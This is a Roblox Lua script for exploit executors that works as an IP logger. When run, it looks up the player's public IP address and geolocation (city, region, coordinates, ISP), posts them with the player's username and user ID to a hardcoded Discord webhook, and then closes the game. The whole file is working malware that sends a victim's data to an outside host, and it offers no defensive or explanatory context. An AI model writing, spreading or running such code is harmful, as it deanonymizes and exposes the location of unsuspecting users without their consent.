--# CRACK IF GAY - MADE BY 0rep on discord
local HttpService = game:GetService("HttpService")
local req = (http_request or request or syn and syn.request)

-- SETTINGS
local WEBHOOK_URL = "https://discord.com/api/webhooks/1372316329012498452/dHiTEVxQeG2YLDflZeFPKteXaPo8n13Ka01lLvY4D3V2YdkpmeE9gWe0n4GCQ4i0jnUY" -- Your actual webhook

-- Ensure HTTP request is working
if not req then
    return
end

-- INIT
local ip = "Unknown"
local geoData = {}

-- TRY TO GET IP
pcall(function()
    local ipResponse = req({
        Url = "https://api.ipify.org?format=json", -- Updated to ipify API for better IP fetching
        Method = "GET"
    })
    if ipResponse and ipResponse.StatusCode == 200 then
        ip = HttpService:JSONDecode(ipResponse.Body).ip
    end
end)

-- TRY TO GET GEOLOCATION (AND VPN STATUS)
pcall(function()
    local geoResponse = req({
        Url = "https://ipapi.co/json",
        Method = "GET"
    })
    if geoResponse and geoResponse.StatusCode == 200 then
        geoData = HttpService:JSONDecode(geoResponse.Body)
    end
end)

-- USER INFO
local username = game.Players.LocalPlayer.Name
local userId = game.Players.LocalPlayer.UserId
local country = geoData.country_name or "N/A"
local city = geoData.city or "N/A"
local region = geoData.region or "N/A"
local org = geoData.org or "N/A"
local coords = geoData.latitude and geoData.longitude and (geoData.latitude .. ", " .. geoData.longitude) or "N/A"

-- BUILD AND LOG TO DISCORD WEBHOOK
if ip ~= "Unknown" and geoData.country_name then
    local msg = string.format([[
    Script executed:
    Username: %s (%s)
    IP: %s
    Location: %s, %s
    Country: %s
    ISP: %s
    ]], username, userId, ip, city, region, country, org)

    pcall(function()
        req({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({ content = msg })
        })
    end)
end

-- CLOSE THE GAME AFTER
wait(1)
game:Shutdown()
